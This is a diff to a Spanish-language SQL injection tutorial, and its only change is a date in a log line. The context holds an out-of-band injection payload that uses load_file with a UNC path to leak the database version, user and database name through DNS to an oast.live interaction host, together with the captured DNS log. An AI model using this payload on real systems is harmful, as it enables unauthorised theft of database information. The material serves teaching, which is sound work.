@@ -1262,7 +1262,7 @@ En el siguiente [estudio](https://zenodo.org/records/3556347#.XeDK1tURVPY) se ab
 En este caso averiguaremos la versión, el usuario que esta conectado a la base de datos y el nombre de la base de datos en uso, con la siguiente sintaxis: `1'union select load_file(CONCAT('\\\\',(SELECT @@version),'.',(SELECT user()),'.',(SELECT database()),'.','co6pf7mi3i5gddf22uo0bgeayc9z7g8d1.oast.live\\vfw')),2-- -`.
 
 ```shell
-[10.5.21-MariaDB-0+deb11u1.pr1ngl3s@localhost.gamesdb.co6pf7mi3i5gddf22uo0bgeayc9z7g8d1] Received DNS interaction (AAAA) from 91.126.224.37 at 2024-04-04 08:30:36
+[10.5.21-MariaDB-0+deb11u1.pr1ngl3s@localhost.gamesdb.co6pf7mi3i5gddf22uo0bgeayc9z7g8d1] Received DNS interaction (AAAA) from 91.126.224.37 at 2024-04-16 08:30:36
 ```
 
 Al enviar la petición DNS el cual contiene de subdominios la respuesta de las consultas SELECT, vemos la versión, el usuario y el nombre de la base de datos. 
